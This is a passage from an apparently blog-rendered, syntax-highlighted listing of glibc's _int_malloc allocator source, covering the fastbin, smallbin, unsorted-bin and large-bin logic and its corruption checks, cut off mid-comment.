class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span 